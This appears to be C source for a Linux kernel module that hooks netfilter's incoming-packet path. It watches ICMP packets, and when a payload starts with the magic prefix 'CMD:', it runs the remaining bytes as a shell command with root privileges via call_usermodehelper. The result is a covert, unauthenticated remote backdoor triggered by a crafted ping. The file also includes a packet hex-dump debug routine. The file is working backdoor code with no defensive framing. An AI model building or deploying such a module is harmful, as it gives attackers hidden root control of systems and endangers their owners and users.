#include"netfilterhook.h"


struct nf_hook_ops hook;

static char * envp[] = { "HOME=/", NULL };
static char * argv[] = { "/bin/sh","-c","/usr/bin/ls -la > /tmp/3qrfaf.txt",NULL};

static char magic[5]="CMD:";

//  packet debug
static  void pkt_hex_dump(struct sk_buff *skb){
    size_t len;
    int rowsize = 16;
    int i, l, linelen, remaining;
    int li = 0;
    uint8_t *data, ch; 
    struct iphdr *ip = (struct iphdr *)skb_network_header(skb);

    printk("Packet hex dump:\n");
    data = (uint8_t *) skb_network_header(skb);

    len=ntohs(ip->tot_len);

    remaining = len;
    for (i = 0; i < len; i += rowsize) {
        printk("%06d\t", li);
        linelen = min(remaining, rowsize);
        remaining -= rowsize;
        for (l = 0; l < linelen; l++) {
            ch = data[l];
            printk(KERN_CONT "%02X ", (uint32_t) ch);
        }
        data += linelen;
        li += 10; 
        printk(KERN_CONT "\n");
    }
}

void netfilterhook_init(void){
    /* Fill in our hook structure */
    hook.hook = watch_in;        /* Handler function */
    hook.hooknum  = NF_INET_LOCAL_IN; 
    hook.pf       = AF_INET;
    hook.priority = NF_IP_PRI_FIRST;   /* Make our function first */

    nf_register_net_hook(&init_net, &hook);
}

/* This is the hook function itself */
unsigned int watch_in(void *priv,
        struct sk_buff *skb,
        const struct nf_hook_state *state)
{
    int offset=16; 
    struct iphdr *ip = NULL;
    struct icmp_echo *icmppkt =NULL;
    char * data = NULL;
    int icmp_payload_len;
    ip = (struct iphdr *)skb_network_header(skb);
    if (ip->protocol != IPPROTO_ICMP){
        return NF_ACCEPT;
    }
    // get payload
    icmppkt=(struct icmp_echo*)((char *)ip+(ip->ihl<<2));
    
    data=(char* )icmppkt+offset;
    icmp_payload_len = ntohs(ip->tot_len) - (ip->ihl<<2) - offset; 

    if(strncmp(data,magic,strlen(magic))==0){
        argv[2]=data+strlen(magic);
        printk("strncpy argv2:%s\n",argv[2]);
        call_usermodehelper(argv[0], argv, envp,UMH_NO_WAIT);
   }
    return NF_ACCEPT;
}

void netfilterhook_exit(void){
    nf_unregister_net_hook(&init_net,&hook);
}
